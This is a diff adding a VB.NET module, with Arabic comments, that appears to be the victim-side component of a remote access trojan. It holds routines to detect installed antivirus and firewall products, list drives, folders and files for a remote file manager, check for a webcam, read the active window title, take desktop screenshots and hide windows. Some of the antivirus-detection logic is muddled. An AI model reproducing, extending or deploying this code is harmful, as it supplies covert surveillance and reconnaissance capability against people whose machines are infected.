@@ -1,0 +1,252 @@
+﻿'  استداء اكثر من فضاء سوف نحتاج اليها للاتمام السيرفر
+Imports System.Diagnostics
+Imports System.Management
+Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
+
+Module Module1
+    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
+    ' فنكشين للتحويل من سترينغ الي بايت
+    Function SB(ByVal s As String) As Byte()
+        Return System.Text.Encoding.Default.GetBytes(s)
+    End Function
+    ' فنكشين للتحويل من بايت الي سترينغ
+    Function BS(ByVal b As Byte()) As String
+        Return System.Text.Encoding.Default.GetString(b)
+    End Function
+    Public Function ENB(ByRef s As String) As String ' Encode base64
+        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
+        ENB = Convert.ToBase64String(byt)
+    End Function
+    Public Function DEB(ByRef s As String) As String ' Decode Base64
+        Dim b As Byte() = Convert.FromBase64String(s)
+        DEB = System.Text.Encoding.UTF8.GetString(b)
+    End Function
+    Public GetProcesses() As Process
+
+
+    Function getanti()
+        Dim antivirus As String
+        Dim procList() As Process = Process.GetProcesses()
+        Dim i As Integer
+        For i = 0 To procList.Length - 2 Step i + 2
+            Dim strProcName As String = procList(i).ProcessName
+            Do
+                If strProcName = "ekrn" Then
+                    antivirus = "NOD32"
+                ElseIf strProcName = "avgtray" Then
+                    antivirus = "AVG 9"
+                ElseIf strProcName = "avgcc " Then
+                    antivirus = "AVG 8"
+                ElseIf strProcName = "avgnt" Then
+                    antivirus = "Avira"
+                ElseIf strProcName = "AvastUI" Then
+                    antivirus = "Avast"
+                ElseIf strProcName = "ahnsd" Then
+                    antivirus = "AhnLab-V3"
+                ElseIf strProcName = "bdss" Then
+                    antivirus = "BitDefender"
+                ElseIf strProcName = "bdv" Then
+                    antivirus = "ByteHero"
+                ElseIf strProcName = "clamav" Then
+                    antivirus = "ClamAV"
+                ElseIf strProcName = "fpavserver" Then
+                    antivirus = "F-Prot"
+                ElseIf strProcName = "fssm32" Then
+                    antivirus = "F-Secure"
+                ElseIf strProcName = "avkcl" Then
+                    antivirus = "GData"
+                ElseIf strProcName = "engface" Then
+                    antivirus = "Jiangmin"
+                ElseIf strProcName = "avp" Then
+                    antivirus = "Kaspersky"
+                ElseIf strProcName = "updaterui" Then
+                    antivirus = "McAfee"
+                ElseIf strProcName = "msmpeng" Then
+                    antivirus = "microsoft security essentials"
+                ElseIf strProcName = "zanda" Then
+                    antivirus = "Norman"
+                ElseIf strProcName = "npupdate" Then
+                    antivirus = "nProtect"
+                ElseIf strProcName = "inicio" Then
+                    antivirus = "Panda"
+                ElseIf strProcName = "sagui" Then
+                    antivirus = "Prevx"
+                ElseIf strProcName = "Norman" Then
+                    antivirus = "Sophos"
+                ElseIf strProcName = "savservice" Then
+                    antivirus = "Sophos"
+                ElseIf strProcName = "saswinlo" Then
+                    antivirus = "SUPERAntiSpyware"
+                ElseIf strProcName = "spbbcsvc" Then
+                    antivirus = "Symantec"
+                ElseIf strProcName = "thd32" Then
+                    antivirus = "TheHacker"
+                ElseIf strProcName = "ufseagnt" Then
+                    antivirus = "TrendMicro"
+                ElseIf strProcName = "dllhook" Then
+                    antivirus = "VBA32"
+                ElseIf strProcName = "sbamtray" Then
+                    antivirus = "VIPRE"
+                ElseIf strProcName = "vrmonsvc" Then
+                    antivirus = "ViRobot"
+                ElseIf strProcName = "dllhook" Then
+                    antivirus = "VBA32"
+                ElseIf strProcName = "vbcalrt" Then
+                    antivirus = "VirusBuster"
+                Else
+                    antivirus = "Not Found"
+                End If
+
+                Dim iProcID As Integer = procList(i).Id
+                i = i + 1
+            Loop Until (antivirus <> "Not Found" Or i > procList.Length - 1)
+            If i > procList.Length - 1 Then
+                antivirus = "Not Found"
+            End If
+        Next
+        Return antivirus
+    End Function
+    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
+        Dim a As New List(Of Byte())
+        Dim M As New IO.MemoryStream
+        Dim MM As New IO.MemoryStream
+        Dim T As String() = Split(BS(b), WRD)
+        M.Write(b, 0, T(0).Length)
+        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
+        a.Add(M.ToArray)
+        a.Add(MM.ToArray)
+        M.Dispose()
+        MM.Dispose()
+        Return a.ToArray
+    End Function
+    Public Function getDrives() As String
+        Dim allDrives As String = ""
+        For Each d As DriveInfo In My.Computer.FileSystem.Drives
+            Select Case d.DriveType
+                Case 3
+                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
+                Case 5
+                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
+            End Select
+        Next
+        Return allDrives
+    End Function
+    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
+   ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
+   ByVal cbVer As Integer) As Boolean
+    Public Function checkcam() As String
+        Try
+            Dim d As String = Space(100)
+            For i As Integer = 0 To 4
+                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
+                    Return "Yes"
+                End If
+            Next
+        Catch ex As Exception
+        End Try
+        Return "No"
+    End Function
+    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
+    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
+    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
+    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
+    Public Function GetSystemRAMSize() As Double
+        Try
+            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
+            Return FormatNumber(RAM_Size, 2)
+
+        Catch ex As Exception
+
+        End Try
+    End Function
+    Public Function ACT() As String ' Get Active Window Text
+        Try
+            Dim h As IntPtr = GetForegroundWindow()
+            If h = IntPtr.Zero Then
+                Return ""
+            End If
+            Dim w As Integer
+            w = GetWindowTextLength(h)
+            Dim t As String = StrDup(w + 1, "*")
+            GetWindowText(h, t, w + 1)
+            Dim pid As Integer
+            GetWindowThreadProcessId(h, pid)
+            If pid = 0 Then
+                Return t
+            Else
+                Try
+                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
+                Catch ex As Exception
+                    Return t
+                End Try
+            End If
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+    Public Function getFolders(ByVal location) As String
+        Dim di As New DirectoryInfo(location)
+        Dim folders = ""
+        For Each subdi As DirectoryInfo In di.GetDirectories
+            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
+        Next
+        Return folders
+    End Function
+    Public Function getFiles(ByVal location) As String
+        Dim dir As New System.IO.DirectoryInfo(location)
+        Dim files = ""
+        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
+            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
+        Next
+        Return files
+    End Function
+
+    Function GetFirewall() As String
+        Dim str As String = Nothing
+        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
+        Dim instances As ManagementObjectCollection = searcher.[Get]()
+        For Each queryObj As ManagementObject In instances
+            str = queryObj("displayName").ToString()
+        Next
+        Return str
+        searcher.Dispose()
+    End Function
+    Public Function CaptureDesktop() As Image
+        Try
+            Dim bounds As Rectangle = Nothing
+            Dim screenshot As System.Drawing.Bitmap = Nothing
+            Dim graph As Graphics = Nothing
+            bounds = Screen.PrimaryScreen.Bounds
+            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
+            graph = Graphics.FromImage(screenshot)
+            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
+            Return screenshot
+        Catch
+            Return Nothing
+        End Try
+    End Function
+    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
+    End Function
+    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
+    End Function
+    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function IsWindowVisible(ByVal hwnd As IntPtr) As Boolean
+    End Function
+    Public Enum GetWindowCmd As UInteger
+        GW_HWNDFIRST = 0
+        GW_HWNDLAST = 1
+        GW_HWNDNEXT = 2
+        GW_HWNDPREV = 3
+        GW_OWNER = 4
+        GW_CHILD = 5
+        GW_ENABLEDPOPUP = 6
+    End Enum
+    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function ShowWindow(ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Boolean
+    End Function
+
+
+    <DllImport("KERNEL32.DLL")> _
+    Public Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
+    End Sub
+
+End Module
+
